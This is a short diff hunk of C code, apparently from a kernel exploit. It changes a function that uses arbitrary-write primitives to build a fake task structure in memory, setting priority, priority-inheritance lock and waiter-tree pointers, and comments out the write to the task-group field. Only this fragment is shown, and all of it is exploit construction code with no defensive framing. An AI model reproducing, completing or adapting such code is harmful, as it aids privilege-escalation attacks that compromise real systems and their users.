@@ -2741,7 +2741,7 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
       !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
       !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
                        FAKE_TASK_PRIO) ||
-      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
+//      !p0_diag_write64(fd, task + FAKE_TASK_TASK_GROUP_OFF, 0) ||
       !p0_diag_write32(fd, task + FAKE_TASK_PI_LOCK_OFF, 0) ||
       !p0_diag_write64(fd, task + FAKE_TASK_PI_WAITERS_OFF,
                        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF) ||
